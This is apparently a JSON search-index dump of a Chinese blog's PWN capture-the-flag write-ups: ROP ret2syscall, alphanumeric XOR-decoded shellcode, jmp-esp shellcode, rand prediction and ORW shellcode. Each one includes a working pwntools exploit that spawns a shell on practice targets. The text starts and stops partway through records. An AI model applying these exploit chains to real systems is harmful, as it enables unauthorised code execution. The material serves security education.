process(\"./main_dahuan01\")\np.sendafter(\"3.Exit\",b\"2\")\np.sendafter(\"login\",b\"0\")\np.sendafter(\"password\",b\"111111\")\np.sendafter(\"4.exit\",b\"3\")\np.interactive()\n```\n\n","tags":["PWN的writeup","大欢老师の屎题","其他类型"],"categories":["PWN不出来"]},{"title":"dahuan_GuessNumber","url":"//docx/dahuan_GuessNumber/","content":"> 随机数\n>\n> 大欢出的一道屎题、不过也算很有意思了。\n>\n\n![](/img/filesimg/dahuan_GuessNumber/dahuan_GuessNumber_0.png)\n\n![](/img/filesimg/dahuan_GuessNumber/dahuan_GuessNumber_1.png)\n\n![](/img/filesimg/dahuan_GuessNumber/dahuan_GuessNumber_2.png)\n\n核心思想就是进入一个func函数中，连续猜对20次数字便可以进入到一个叫做flag()的函数里\n\n![](/img/filesimg/dahuan_GuessNumber/dahuan_GuessNumber_3.png)\n\nflag函数就是一个获取buf，然后把你输入的buf放入system里面来运行的玩意。而且没有可供栈溢出的空间。\n\n在把buf传给system之前会有一个filter函数，这个里面会用str来对比字符串，如果我输入的东西里面有什么值被程序制作着定义为“不可以输入的”那么就会直接退出程序：\n\n![](/img/filesimg/dahuan_GuessNumber/dahuan_GuessNumber_4.png)\n\n简直就是把可以禁用的全禁用了。\n\n\n\n猜数字其实才是要记录的核心，就是用LibcSearcher库里面的cdll.LoadLibrary函数。因为我们的srand使用的time函数，是在题目所诞生的环境里诞生的。按照道理同一个环境的电脑同一时刻用time(0)作为种子生成出来的随机数一定是一样的。所以我们用附件里面的libc来生成随机数即可。\n\nexp：\n\n```python\nfrom pwn import *\nfrom ctypes import *\nfrom LibcSearcher import *\n\ncontext(log_level = 'debug', arch = 'amd64', os = 'linux')\n\nfile_addr = './dahuan_GuessNumber'\np = process(file_addr)\n\nlibc = cdll.LoadLibrary('libc.so.6')\nlibc.srand(libc.time(0))\np.sendafter(b\"go! go! go!\",str(libc.rand()%100)+'\\n')\nfor i in range(20):\n    p.sendafter(b\"good!!!\",str(libc.rand()%100)+'\\n')\n\np.interactive()\n```\n\n至于怎么找到flag嘛...\n\n![](/img/filesimg/dahuan_GuessNumber/dahuan_GuessNumber_5.png)\n\n`./flag`即可\n\n别问，最狗屎的答案，是大欢和我的两个蠢人灵机一动搞出来的\n\n嘻嘻\n\n","tags":["PWN的writeup","随机数","大欢老师の屎题"],"categories":["PWN不出来"]},{"title":"inndy_rop","url":"//docx/inndy_rop/","content":"> ROP-ret2syscall 栈溢出\n>\n> [https://buuoj.cn/challenges#inndy_rop](https://buuoj.cn/challenges#inndy_rop)\n>\n\n![](/img/filesimg/inndy_rop/inndy_rop_0.png)\n\n![](/img/filesimg/inndy_rop/inndy_rop_1.png)![](/img/filesimg/inndy_rop/inndy_rop_2.png)\n\n开了栈堆执行保护，有很多函数应该是静态链接，然后main函数里面有一个overflow，纯粹的小栈溢出。\n\n这道题的思路大概是这样的：通过不断地创造return，跳转，来执行很多语句。\n\n我们的目的是执行一个execv(\"/bin/sh\")，首先先要塞入/bin/sh，通过read函数来塞入到.bss段，然后再通过execv(.bss_addr)的内容即可.\n\n![](/img/filesimg/inndy_rop/inndy_rop_3.png)\n\n.bss段有好多空缺的部分啊，随便找个地址吧：`bss_addr = 0x080EC010`\n\n然后让我们回忆一下这几个参数：首先`int 0x80`是`syscall`的作用，第一参数为`eax`，也就是调用`int 0x80`对应的函数。例如read是0x03，execv是0x0b\n\n然后read和execv都有三个参数，在系统中，某个函数的第一参数是ebx，第二参数是ecx，第三参数是edx。如果加上`int 0x80`的用于选择调用系统函数的第一参数的话，上面就分别是第二参数到第四参数了。\n\n我们需要找很多的指令地址，并且他们后面都要有ret才能去下一个地址位置：\n\n通过ropper工具来查找：\n\n![](/img/filesimg/inndy_rop/inndy_rop_4.png)\n\n![](/img/filesimg/inndy_rop/inndy_rop_5.png)![](/img/filesimg/inndy_rop/inndy_rop_6.png)![](/img/filesimg/inndy_rop/inndy_rop_7.png)![](/img/filesimg/inndy_rop/inndy_rop_8.png)\n\n分别是：\n\n`int080_addr = 0x0806f430`\n\n`popeax_addr = 0x080b8016`\n\n`popebx_addr = 0x080481c9`\n\n`popecx_addr = 0x080de769`\n\n`popedx_addr = 0x0806ecda`\n\n逻辑是：我需要构造一个read(0,bss地址,8)的读取，这段代码的意思是从标准读取（第一参数=0）中读取内容，取8（第三参数=8）个字节，存放到bss地址（第二参数）中。随后再构造一个execv(\"/bin/sh\",0,0)函数，类似于system（“/bin/sh”）。具体如exp：\n\nexp：\n\n```python\nfrom pwn import *\n\ncontext(log_level = 'debug', arch = 'i386', os = 'linux')\n\n\nip='node5.buuoj.cn'\nport=26102\nfile_addr = './rop'\np = remote(ip,port)\n# p = process(file_addr)\nelf = ELF(file_addr)\n#强迫症这一块\nbss_____addr = 0x080e9000+0x100\nint0x80_addr = 0x0806f430\npopeax__addr = 0x080b8016\npopebx__addr = 0x080481c9\npopecx__addr = 0x080de769\npopedx__addr = 0x0806ecda\n#read(0,.bss,8), READ_FUNCTION = 3\npayload = b'a'*(12+4)\npayload += p32(popeax__addr) + p32(0x03)\npayload += p32(popebx__addr) + p32(0x00)\npayload += p32(popecx__addr) + p32(bss_____addr)\npayload += p32(popedx__addr) + p32(0x08)\npayload += p32(int0x80_addr)\n#execv(.bss,0,0), EXECV_FUNCTION = 0x0b\npayload += p32(popeax__addr) + p32(0x0b)\npayload += p32(popebx__addr) + p32(bss_____addr)\npayload += p32(popecx__addr) + p32(0)\npayload += p32(popedx__addr) + p32(0)\npayload += p32(int0x80_addr)\np.sendline(payload)\np.sendline(b\"/bin/sh\\x00\")\np.interactive()\n```\n\n","tags":["PWN的writeup","buuctf","ret2系列"],"categories":["PWN不出来"]},{"title":"[NewStarCTF 2023 公开赛道]shell code revenge","url":"//docx/[NewStarCTF 2023 公开赛道]shell code revenge/","content":"> 特殊shellcode\n>\n> [https://buuoj.cn/challenges#[NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93]shellcode%20revenge](https://buuoj.cn/challenges#[NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93]shellcode%20revenge)\n>\n\n这道题有点像我之前做过的mrctf的shellcode的revenge。不过范围不一样。\n\n![](/img/filesimg/[NewStarCTF%202023%20公开赛道]shell%20code%20revenge/[NewStarCTF%202023%20公开赛道]shell%20code%20revenge_0.png)\n\n大概看一下，把所有的大写字母和数字都排除在外了，意思是只要输入大写字母和数字就不会被break——跳出。\n\n所以我们要创造一个只有大写字母和数字的shellcode？\n\n然后我也懒得checksec了，而且用的是rsp——也就是64位。开了一些保护啥的，反正jumpout到的66660000h这个地址在上面的mmap里面写入了权限'7'（第三参数），也就是可读可写可执行。\n\n整个代码的逻辑是：出现Show me your magic之后，进入一个for循环，for循环一开始会有一个read让我们输入数据，因为是一个char类型指针`buf`，每次读取一个值。然后下面的`strncpy()`会把我们一个一个输入的buf存到src里面的src复制到我们的0x66660000地址里面，我们可以看main函数的堆栈视图：\n\n![](/img/filesimg/[NewStarCTF%202023%20公开赛道]shell%20code%20revenge/[NewStarCTF%202023%20公开赛道]shell%20code%20revenge_1.png)\n\n我们要将数据存放到src的位置，而且只能输入264个字符（这264字符是可用的shellcode长度）。\n\n不过这道题目比较难，是一个可见字符shellcode。要构造一个可见字符shellcode还必须是大写和数字就很麻烦了，目前自动生成的大部分都是大小写+数字的组合。\n\n这边用了一个read函数，其中第一参数是0，也就是fd里面的标准输入，我输入进去的东西都会从这个里面获取到，第二参数是buf变量地址（一个指针）也就是读取的大小，第三参数是读取权限。\n\n![](/img/filesimg/[NewStarCTF%202023%20公开赛道]shell%20code%20revenge/[NewStarCTF%202023%20公开赛道]shell%20code%20revenge_2.png)\n\n汇编这里会写的更清楚一点，edi的值变成了0。我们可以通过这个值进行运算，例如[edi+0x10]得到的值就是0+0x10=0x10。\n\n现在的思路是，我可以用可见字符来构造一个最小的shellcode，目的是为了调用read函数，让read函数再一次读取值存放到66660000h这个地址上，覆盖我之前的为了调用read函数而构造的shellcode，再一次读取的shellcode不会有什么奇怪的判定条件，它可以直接执行我输入进去的任何东西。\n\n# 构造第一段shellcode - read函数\n构造可见ASCII shellcode是一个很麻烦的工作，我们先看一下普通的shellcode，拿64位举例：\n\n```plain\n;;nasm -f elf64 shellcode64.asm\n;;ld -m elf_x86_64 -o shellcode64 shellcode64.o\n;;objdump -d shellcode64\nglobal _start\n_start:\n    mov rbx, '/bin/sh'     ; 把字符串\"/bin/sh\"的地址放到rbx寄存器\n    push rbx               ; 将\"/bin/sh\"的地址压入栈\n    push rsp               ; 把当前栈顶指针（指向\"/bin/sh\"地址）压入栈\n    pop rdi                ; 从栈弹出数据到rdi，使rdi指向\"/bin/sh\"\n    xor rsi, rsi           ; 清空rsi（argv参数设为0）\n    xor rdx, rdx           ; 清空rdx（envp参数设为0）\n    push 0x3b              ; 把系统调用号0x3b压入栈\n    pop rax                ; 从栈弹出数据到rax，设置系统调用号\n    syscall                ; 执行系统调用\n```\n\n最麻烦的部分就是`/bin/sh`和`syscall`，一个是字符串，另外一个是命令。其中`syscall`的机器码是`0x0f05`，汇编的书籍或Intel/AMD开发者用书里面也会说到。\n\n可是syscall不是可见字符啊，更不是A-Z，0-9之间的数值。这要怎么办？\n\n## 异或加密\n异或是一种逻辑运算，A<font style=\"color:rgb(17, 17, 17);\">⊕</font>B得到的值是C，而C<font style=\"color:rgb(17, 17, 17);\">⊕B之后得到的值就是A。逻辑如下：、</font>\n\n![image](/img/filesimg/[NewStarCTF%202023%20公开赛道]shell%20code%20revenge/[NewStarCTF%202023%20公开赛道]shell%20code%20revenge_3.png)\n\n<font style=\"color:rgb(17, 17, 17);\">如此，我就可以构造一个这样的设计：</font>\n\n![image](/img/filesimg/[NewStarCTF%202023%20公开赛道]shell%20code%20revenge/[NewStarCTF%202023%20公开赛道]shell%20code%20revenge_4.png)\n\n![image](/img/filesimg/[NewStarCTF%202023%20公开赛道]shell%20code%20revenge/[NewStarCTF%202023%20公开赛道]shell%20code%20revenge_5.png)\n\n<font style=\"color:rgb(17, 17, 17);\">我们假设字符'A'为密钥，将syscall作为原始数据输入计算得到加密数据：0x0f05⊕0x4141=0x4e44（都为可见字符），所以我们确实可以用它来作为密钥。</font>\n\n<font style=\"color:rgb(17, 17, 17);\">加密后的syscall需要写入内存，但是直接写入的指令mov机器码很显然不是可见字符，而xor为可见字符0x33='3'。或者0x31='1'。</font>\n\n<font style=\"color:rgb(17, 17, 17);\">为什么有两个？是因为xor的运算符定义是这样的：</font>\n\n```plain\nxor [a值], [b值]\n```\n\n<font style=\"color:rgb(17, 17, 17);\">而在汇编里面，寄存器需要放在前面，其他的放在后面，也就变成了:</font>`<font style=\"color:rgb(17, 17, 17);\">xor 寄存器, 其他值</font>`<font style=\"color:rgb(17, 17, 17);\">，所代表的意思也就是将寄存器里面的值和其他值进行异或处理后，存储到寄存器里面。</font>\n\n<font style=\"color:rgb(17, 17, 17);\">如果我们要实现：</font>`<font style=\"color:rgb(17, 17, 17);\">xor 其他值, 寄存器</font>`<font style=\"color:rgb(17, 17, 17);\">，也就是将其他值和寄存器做异或处理后，将计算后的值存储到其他值里面，这个时候在机器码里面，依旧要按照：</font>`<font style=\"color:rgb(17, 17, 17);\">xor机器码 寄存器机器码，其他值</font>`<font style=\"color:rgb(17, 17, 17);\">的顺序。</font>\n\n<font style=\"color:rgb(17, 17, 17);\">于是就有了两个xor，一个代表的是第一种情况，一个代表第二种情况，分别为</font>`<font style=\"color:rgb(17, 17, 17);\">0x33</font>`<font style=\"color:rgb(17, 17, 17);\">和</font>`<font style=\"color:rgb(17, 17, 17);\">0x31</font>`\n\n## 异或解密syscall\n<font style=\"color:rgb(17, 17, 17);\">这个时候我们就可以开始构造一些东西了，首先看代码，</font>![](/img/filesimg/[NewStarCTF%202023%20公开赛道]shell%20code%20revenge/[NewStarCTF%202023%20公开赛道]shell%20code%20revenge_6.png)\n\n我们会发现在jmp到66660000h这个地址前，我们的eax被归0了，所以就可以利用这一点，配合xor来创造\n\n<font style=\"color:rgb(17, 17, 17);\">并且制造出syscall的加密数据形式0x4e444e44（输入两遍是为了防止一遍不运行）</font>\n\n<font style=\"color:rgb(17, 17, 17);\">首先一开始是</font>`<font style=\"color:rgb(17, 17, 17);\">xor eax,NUM</font>`<font style=\"color:rgb(17, 17, 17);\">，实际上是</font>`<font style=\"color:rgb(17, 17, 17);\">[rdx+0x38]</font>`<font style=\"color:rgb(17, 17, 17);\">，为什么是</font>`<font style=\"color:rgb(17, 17, 17);\">rdx+NUM</font>`<font style=\"color:rgb(17, 17, 17);\">？在这里我们看到esi和edx都被复制为了66660000h，实际上这个就是打定了</font>**<font style=\"color:rgb(17, 17, 17);\"> 内存区域中的基地址</font>**<font style=\"color:rgb(17, 17, 17);\"> ，那为什么偏偏是这个地址呢？这其实有点玄学，因为似乎rdx会作为这个偏移值的基地址，而刚好这边初始化了edx。而大概率选择了rdx作为基地址来偏移。</font>\n\n我们构造这么一个逻辑：\n\n![画板](/img/filesimg/[NewStarCTF%202023%20公开赛道]shell%20code%20revenge/[NewStarCTF%202023%20公开赛道]shell%20code%20revenge_7.png)\n\n这里面有很多零碎的知识点，我们先讲一个大概，后面慢慢补充：\n\n首先是上面的机器码部分，因为程序必须输入可见字符，其中第一部分的可见字符是0x30~0x39，可见字符'0'~'9'的部分。我在这里输入的是`0x33 0x42 addr1`，这个代码的汇编样式是：`xor rax, [addr1]`，目的是将rax里面的值改成'A'，`0x42`是寄存器`rax`的机器码。rax的值一开始为0，A<font style=\"color:rgb(17, 17, 17);\">⊕0=A，而\t\t</font>\n\n```plain\nrax==0, [addr]=='A'\nrax=rax⊕[addr1]\n   =0⊕'A'\n   ='A'\n```\n\n<font style=\"color:rgb(17, 17, 17);\">通过这一步，我就可以把rax的值改成'A'了。</font>\n\n<font style=\"color:rgb(17, 17, 17);\">然后第二步，使用xor指令配合修改成'A'值的寄存器rax对下面的加密后syscall做处理。第一个加密syscall的起始地址为addr2，利用</font>`<font style=\"color:rgb(17, 17, 17);\">0x31 0x42 addr2</font>`<font style=\"color:rgb(17, 17, 17);\">这个命令，就可以修改addr2中的数据。逻辑为：[addr2] ⊕ rax =</font>\n\n```plain\n[addr2]==0x4e, rax=='A'\n[addr2]=[addr2]⊕rax\n       =0x4e⊕0x41\n       =0x0f\n```\n\n第三步，我们要还原rax寄存器的值为0，为什么？因为我们的核心逻辑是再调用一次read函数，然后读取我们写入的第二段shellcode（可以直接进入/bin/sh的）到特定的内存里，然后让PC，也就是程序计数器读到第二段shellcode的内容执行即可。用rax里面的值随便找一个'A'做异或即可。\n\n```plain\nrax=='A' [addr1]=='A'\nrax=rax⊕[addr1]\n   ='A'⊕'A'\n   ='A'\n```\n\n如此完成后，即可。\n\n现在的问题是`addr2`和`addr1`应该是多少？\n\n因为我们输入的`addr2`和`addr1`必须是可见字符，也就是0x30-0x39之间的数值，而二遍`syscall`最多占用四个地址。所以我们把第一个`syscall`的起始地址addr2放在0x30的位置就行了。中间用`pop rcx`这种方式来过度，他的机器码刚好也是一个可见字符，而rcx在程序中这个寄存器也没有用到，他里面的值是多少不重要（类似于`NOP`滑块指令，目的只是塞入值，并且让程序读到这些中间值又可以运行）\n\n而addr的地址则为0x30后4个数字（因为包括0x30，所以第4个数字实际上是0x33），在第五位的时候塞入数据'A'做填充。一般而言只要两个'A'就行了。我们这边填充8个A。所以第一段的代码就被写出来了：\n\n```python\npayload =  b'\\x33\\x42\\x38'  #33 42 38 xor eax, DWORD PTR [rdx+0x38]\npayload += b'\\x31\\x42\\x30'  #31 42 30 xor DWORD PTR [rdx+0x30], eax\npayload += b'\\x33\\x42\\x38'  #33 42 38 xor eax, DWORD PTR [rdx+0x38]\n# payload += b'\\x31\\x42\\x38'  #31 42 38 xor DWORD PTR [rdx+0x38], eax 这个可以保证最后rdx0x38里面的值变成A？\npayload += b'\\x59'*(0x30-len(payload))  #59 pop rcx\npayload += b'\\x4e\\x44'*2    #syscall  0x4e^0x41=0xf 0x44^0x41=0x5\npayload += b'A' * 8        #xor key\np.sendlineafter(\"magic\\n\",payload)\n```\n\n### 一些没有讲的小问题\n![画板](/img/filesimg/[NewStarCTF%202023%20公开赛道]shell%20code%20revenge/[NewStarCTF%202023%20公开赛道]shell%20code%20revenge_8.png)\n\n1、为什么我只异或了0x30地址上的4e，`syscall`却正常运作了呢？\n\n不知为何，寄存器不知道调用的是`eax`还是`rax`，其实不重要，他会与后面所有的字符A做异或，然后再与两个字节的`syscall`，也就是两个`0x4e44`做处理。如果我在这里后面的字符'A'只有两个的话就会与第一个`0x4e44`做处理，这个是gdb后的结果，原理是什么我也不清楚...所以字符'A'的长度必须大于2，不然`0x44`的部分就不会被处理了。\n\n2、如果我把`payload`中的\\x38改成\\x3a（也是存有'A'的地址），为什么运行不了呢？\n\n因为0x3a是字符':'，不是可见字符......\n\n# 第二段shellcode\n第二段就很简单了，我只需要放入NOP字符滑过和覆盖之前的内容即可，然后再塞入/bin/sh的shellcode即可。\n\n```python\np.sendline(b'\\x90'*0x50+asm(shellcraft.sh()))\n```\n\n\n\n# 全部代码：\n```python\n#[NewStarCTF 2023 public race]shellcode revenge\nfrom pwn import *\ncontext(log_level = 'debug', arch = 'amd64', os = 'linux')\nip='node5.buuoj.cn'\nport=27424\np = remote(ip,port)\n\npayload =  b'\\x33\\x42\\x38'  #33 42 38 xor eax, DWORD PTR [rdx+0x38]\npayload += b'\\x31\\x42\\x30'  #31 42 30 xor DWORD PTR [rdx+0x30], eax\npayload += b'\\x33\\x42\\x38'  #33 42 38 xor eax, DWORD PTR [rdx+0x38]\npayload += b'\\x59'*(0x30-len(payload))  #59 pop rcx\npayload += b'\\x4e\\x44'*2    #syscall  0x4e^0x41=0xf 0x44^0x41=0x5\npayload += b'A' * 8        #xor key\np.sendlineafter(\"magic\\n\",payload)\npause()\np.sendline(b'\\x90'*0x50+asm(shellcraft.sh()))\np.interactive()\n\n```\n\n","tags":["shellcode","PWN的writeup","buuctf"],"categories":["PWN不出来"]},{"title":"ciscn_2019_s_9","url":"//docx/ciscn_2019_s_9/","content":"> Shellcode 栈溢出\n>\n> https://buuoj.cn/challenges#ciscn_2019_s_9\n>\n\n首先checksec一下，看一下大概内容：\n\n![](/img/filesimg/ciscn_2019_s_9/ciscn_2019_s_9_0.png)\n\nIDA打开之后，发现有一个后门函数hint，逻辑如下：\n\n![](/img/filesimg/ciscn_2019_s_9/ciscn_2019_s_9_1.png)\n\n使用此函数的时候，执行esp里面的内容（使用了jmp），我们不需要这些上面什么乱七八糟的东西，我们只需要.text里面的`0x08048554`的jmp esp就行了。先记下来这是我们可以利用的漏洞。\n\n![](/img/filesimg/ciscn_2019_s_9/ciscn_2019_s_9_2.png)\n\n然后这里是程序唯一一个输入口，也就是说大概率这里有漏洞： 他首先可以让我输入32h的内容，不过通过伪C代码（其实汇编也能看到），这个字符串的长度只有24。也就是说可以构造栈溢出，这个就很简单了。那么我现在构造含有shellcode这样的一个payload：\n\n![](/img/filesimg/ciscn_2019_s_9/ciscn_2019_s_9_3.png)\n\n所以说，大概代码如下：\n\n```python\nfrom pwn import*\ncontext(log_level = 'debug', arch = 'i386', os = 'linux')\np = remote('node5.buuoj.cn',29162)\n# p = process(\"./ciscn_s_9\")\n#shellcode = asm(shellcraft.sh())\nshellcode_handmade = asm(\"\"\"\n    xor eax,eax\n    push 0x0068732f\n    push 0x6e69622f\n    mov ebx, esp \n    mov al, 0xb\n    int 0x80                         \n\"\"\")\njmp_esp_addr = 0x8048554\nshell = asm('''\nsub esp,0x28\ncall esp\n''')\npayload = shellcode_handmade.ljust(32+4,b'a') + p32(jmp_esp_addr) + shell\nprint(payload)\np.sendafter(b'tell?\\n',payload)\np.interactive()\n```\n\n如果直接用`shellcraft.sh()`的话，生成出来的shellcode就太大了，会超过程序给我们的栈可用长度（38字节）\n\n","tags":["shellcode","PWN的writeup","buuctf"],"categories":["PWN不出来"]},{"title":"mrctf2020_shellcode_revenge","url":"//docx/mrctf2020_shellcode_revenge/","content":"> 类型：shellcode 字符审查\n>\n> https://buuoj.cn/challenges#mrctf2020_shellcode\n>\n\n一如既往的checksec\n\n![](/img/filesimg/mrctf2020_shellcode_revenge/mrctf2020_shellcode_revenge_0.png)\n\n打开ida之后我们发现图形化反汇编mian函数里面有很多的跳转。我们直接F5，会报错，说call rax这一行有问题。我们直接右键未定义即可。\n\n![](/img/filesimg/mrctf2020_shellcode_revenge/mrctf2020_shellcode_revenge_1.png)\n\n看起来是一堆if字符检测，我们拿出离散数学的知识和ASCII码表对照一看就会快速发现这是一个把所有的**非字母、非数字常规文本字符**给去掉了。只有“qwertyuiopasdfghjklzxcvbnm QWERTYUIOPASDFGHJKLZXCV BNM 1234567890”这些字符。\n\n然后原理和[mrctf2020_shellcode](/docx/mrctf2020_shellcode/)一样，读入什么执行什么。\n\n我们可以用alpha3工具来帮我们生成这个shellcode：[alpha3.py](/docx/alpha3.py/)\n\nok了，然后我们就得到64位的shellcode字符串化的串为：\n\n```python\nPh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2O2u2E0Z7m0n7m0R0b2x2o0Y102x0B7O2A1P2J0n102j0V0l2A0T170Z2j0Y7N0O1O137M0I1P132v0H0V10142v060H0f11000J0q11180I1711160J0Z110h0k060V0y0g2E0m0K170u0n110m2H11120n2n0U1N0f7N0m0H192m0n2n0U10112t0H12131k2k0h0l02102w0m0I112m2w0C01\n```\n\n操，太长了。然后我发现用python2的方法生成的可以打通\n\nexp如下：\n\n```python\nfrom pwn import*\ncontext(log_level = 'debug', arch = 'i386', os = 'linux')\n\nip='node5.buuoj.cn'\nport=26117\n\nfile_addr = './mrctf2020_shellcode_revenge'\n\np = remote(ip,port)\n#p = process(file_addr)\nelf = ELF(file_addr)\n\n\nshellcode = b'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00'\npayload = shellcode\n\nprint(payload)\n\np.sendafter(b'magic',payload)\np.interactive()\n```\n\n","tags":["shellcode","PWN的writeup","buuctf"],"categories":["PWN不出来"]},{"title":"pwnable_orw【有问题】","url":"//docx/pwnable_orw【有问题】/","content":"> Shellcode、ORW\n>\n> https://buuoj.cn/challenges#pwnable_orw\n>\n\n首先checksec\n\n![](/img/filesimg/pwnable_orw【有问题】/pwnable_orw【有问题】_0.png)\n\n32位系统下，栈可执行，有金丝雀。看一下代码：\n\n![](/img/filesimg/pwnable_orw【有问题】/pwnable_orw【有问题】_1.png)\n\n代码相当简单，有一个seccomp的初始化，然后read了一个shellcode（字符串），然后以shellcode字符串的地址直接在栈上执行。根据题目叫做pwn able orw，也就是一道考察ORW syscall的题目。\n\n查看一下seccomp启用呢？\n\n![](/img/filesimg/pwnable_orw【有问题】/pwnable_orw【有问题】_2.png)\n\n启用了open、read、write和exit，还有一个什么sigreturn和rt_sigreturn，和一个架构。\n\n之前写过类似的题目，详细记录在这：[shellcode1_dahuan02](https://wcnt1scvq1i1.feishu.cn/docx/PTr6duEKrosiT6xvLVncZSW0nSc)\n\n不过这个是32位系统的，我们按照32位做一个ORWshellcode就可以了\n\n```python\nfrom pwn import *\n# r = process(\"./orw\")\nr = process('./orw')\nelf = ELF('./orw')\n# r = remote('node5.buuoj.cn',27768)\nbss_addr = elf.bss()\n# gdb.attach(r,'b main')\n# shellcode = shellcraft.open('flag')\n# shellcode += shellcraft.read(3, bss_addr, 0x100)\n# shellcode += shellcraft.write(1, bss_addr, 0x100)\nshellcode = \"\"\"\n    mov ebx, 0x67616c66\n    xor ecx, ecx\n    xor edx, edx\n    mov eax, 5\n    int 0x80\n\n    mov ebx,3\n    mov ecx, 0x804a040\n    xor edx, edx\n    mov dh, 0x100 >> 8\n    mov eax,3\n    int 0x80\n\n    mov ebx, 1\n    mov ecx,0x804a040\n    xor edx, edx\n    mov dh, 0x100 >> 8\n    mov eax,4\n    int 0x80\n\"\"\"\nprint(shellcode)\nshellcode = asm(shellcode, arch = 'i386', os='linux')\nr.sendline(shellcode)\nr.interactive()\n```\n\n但是很可惜的是不知道为什么这道题目没有办法写出来。不管是本地还是远程都有段错误。这个段错误非常的奇怪，不知为何就是解决不了。而且我看别人的视频里面的解法里面也是有段错误的，但是非常奇怪别人可以正常获得flag。\n\n![](/img/filesimg/pwnable_orw【有问题】/pwnable_orw【有问题】_3.png)\n\n| <font style=\"color:rgb(79, 79, 79);\">3</font> | <font style=\"color:rgb(79, 79, 79);\">read</font> | <font style=\"color:rgb(79, 79, 79);\">0x03</font> | <font style=\"color:rgb(79, 79, 79);\">unsigned int fd</font> | <font style=\"color:rgb(79, 79, 79);\">char *buf</font> | <font style=\"color:rgb(79, 79, 79);\">size_t count</font> |\n| :---: | :---: | :---: | :---: | :---: | :---: |\n| <font style=\"color:rgb(79, 79, 79);\">4</font> | <font style=\"color:rgb(79, 79, 79);\">write</font> | <font style=\"color:rgb(79, 79, 79);\">0x04</font> | <font style=\"color:rgb(79, 79, 79);\">unsigned int fd</font> | <font style=\"color:rgb(79, 79, 79);\">const char *buf</font> | <font style=\"color:rgb(79, 79, 79);\">size_t count</font> |\n| <font style=\"color:rgb(79, 79, 79);\">5</font> | <font style=\"color:rgb(79, 79, 79);\">open</font> | <font style=\"color:rgb(79, 79, 79);\">0x05</font> | <font style=\"color:rgb(79, 79, 79);\">const char *filename</font> | <font style=\"color:rgb(79, 79, 79);\">int flags</font> | <font style=\"color:rgb(79, 79, 79);\">umode_t mode</font> |\n\n\n以后有时间在解决吧。这个问题。\n\n","tags":["shellcode","PWN的writeup","buuctf"],"categories":["PWN不出来"]},{"title":"mrctf2020_shellcode","url":"//docx/mrctf2020_shellcode/","content":"> 类型：pwn、shellcode \n>\n> https://buuoj.cn/challenges#mrctf2020_shellcode\n>\n\n首先检查文件\n\n![](/img/filesimg/mrctf2020_shellcode/mrctf2020_shellcode_0.png)\n\n大概了解情况之后，根据题目标题，我大概知道是shellcode，然后打开IDA查看一下代码长啥样。\n\n![](/img/filesimg/mrctf2020_shellcode/mrctf2020_shellcode_1.png)\n\n一整个流程是这样的，然后`F5`也没有办法正常反编译成伪C。\n\n![](/img/filesimg/mrctf2020_shellcode/mrctf2020_shellcode_2.png)\n\n整个使用流程大概如此。\n\n再回到汇编，在输出之后可以让我读取值。因为`call`了`read`函数\n\n```plain\n#include <unistd.h>\nssize_t read(int fd, void *buf, size_t count);\n//其中，fd是文件描述符\n//buf是指向数据将被读取的缓冲区的指针\n//而count是期望读取的字节数\n//当调用read函数时，它会尝试从fd指向的文件中读取count个字节的数据到buf所指向的内存中。如果读取成功，函数返回实际读取到的字节数；如果读取到文件末尾或没有可读取的数据，函数返回0；如果发生错误，则返回-1，并将错误代码存入errno中。\n```\n\n![](/img/filesimg/mrctf2020_shellcode/mrctf2020_shellcode_3.png)\n\n这边题目给了不少备注，在程序的一开始用了一个buf什么-410h，这个就是rbp的缓冲区。然后在这个下面的时候edx400h的意思是给read函数提供了400h的缓冲区。也就是说我可以输入400的内容并且不会栈溢出。\n\n通过lea操作符，rax获取了rbp+buf的地址，如果main函数栈从0开始，那么rax现在值就是栈中地址-410h。\n\n通过read函数不难发现，读取值的void *buf是一个空类型指针，将rax的地址交给他开始读取数据。此时此刻，栈中的数据会被rsi寄存器（这边的寄存器被当作指针用，获取string数据）\n\n在这里，程序要获取400h的值，那相当多了。获取这些数据要干嘛？接着往下找：\n\n![](/img/filesimg/mrctf2020_shellcode/mrctf2020_shellcode_4.png)\n\n然后，通过一个jg进行跳转，我们先不管这个jump greater的条件。不难发现当判断正确的时候（也就是蓝色的线），会再一次把rbp+buf这个地址交给rax，此时此刻rax就是指向我们刚刚才输入进去的数据的。然后使用了call指令，也就会导致我们输入进去的数据在栈中会被执行。\n\n我们再回来看这个比较到底是啥：首先mov了eax的值到rbp+ver_4的位置，然后将0和这个值进行比较，如果大于那么就跳转到蓝色部分，否则红色部分。\n\n不过在read函数调用之前我们就发现，mov eax,0已经把eax寄存器中的值变成0。\n\n![](/img/filesimg/mrctf2020_shellcode/mrctf2020_shellcode_5.png)\n\n在gdb调试后的时候非常神奇，我们的eax虽然被归0了，但是似乎使用完read函数之后，他就莫名其妙的得到了一个0xA的值（并非莫名其妙，最后会讲）。不管如何，他现在反正是大于0的。于是乎我们接下来输入的东西就会被正常执行了，可喜可贺。\n\n```python\nfrom pwn import*\ncontext(log_level = 'debug', arch = 'amd64', os = 'linux')\nshellcode = asm(shellcraft.sh())\np = remote(\"node5.buuoj.cn\",26437)\n#p = process(\"./mrctf2020_shellcode\")\npayload = shellcode\np.send(payload)\np.interactive()\n```\n\n直接用自带工具构造一个shellcode做成payload，一把梭直接结束。\n\n![](/img/filesimg/mrctf2020_shellcode/mrctf2020_shellcode_6.png)\n\nls后flag在根目录下，直接cat，然后结束。\n\n**孩子们，我们是不是忘记那个奇怪的eax怎么获得0x0A的值了？**\n\n是的，现在我们来回顾一下这个傻逼read函数：\n\n```c\n#include <unistd.h>\nssize_t read(int fd, void *buf, size_t 